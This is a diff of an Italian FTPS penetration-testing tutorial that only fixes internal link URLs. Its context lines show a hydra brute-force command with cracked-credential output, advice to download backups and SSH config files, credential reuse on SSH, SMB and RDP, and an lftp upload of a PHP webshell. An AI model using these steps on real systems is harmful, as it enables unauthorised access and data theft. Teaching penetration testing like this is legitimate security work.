@@ -130,7 +130,7 @@ drwxr-xr-x   2 user group     4096 Jan 15 backup/
 -rw-------   1 user group     1234 Jan 15 .ssh_config
 ```
 
-**Lettura dell'output:** directory `backup/` e file `db_export.sql.gz` sono target primari. `.ssh_config` potrebbe contenere chiavi o hostname interni. Per la [post-exploitation via file sensibili](https://hackita.it/articoli/post-exploitation), scarica tutto.
+**Lettura dell'output:** directory `backup/` e file `db_export.sql.gz` sono target primari. `.ssh_config` potrebbe contenere chiavi o hostname interni. Per la [post-exploitation via file sensibili](https://hackita.it/articoli/post-exploitation/), scarica tutto.
 
 ### Test TLS completo con testssl.sh
 
@@ -192,7 +192,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt ftps://10.10.10.70:990 -t 4
 [990][ftps] host: 10.10.10.70   login: admin   password: Backup2025!
 ```
 
-**Cosa fai dopo:** accedi con le credenziali e scarica i file. Il canale dati (989) si attiverà automaticamente durante il download. Per il [brute force su altri protocolli](https://hackita.it/articoli/bruteforce), testa le stesse credenziali su SSH, SMB e RDP.
+**Cosa fai dopo:** accedi con le credenziali e scarica i file. Il canale dati (989) si attiverà automaticamente durante il download. Per il [brute force su altri protocolli](https://hackita.it/articoli/brute-force/), testa le stesse credenziali su SSH, SMB e RDP.
 
 **Download file sensibili**
 
@@ -228,7 +228,7 @@ lftp> put /tmp/shell.php -o /var/www/html/shell.php
 shell.php uploaded
 ```
 
-**Cosa fai dopo:** se la directory corrisponde alla web root, hai una webshell accessibile via browser. Consulta le [tecniche di upload e webshell](https://hackita.it/articoli/webshell).
+**Cosa fai dopo:** se la directory corrisponde alla web root, hai una webshell accessibile via browser. Consulta le [tecniche di upload e webshell](https://hackita.it/articoli/webshell/).
 
 **MitM sul canale dati con cipher deboli**
 
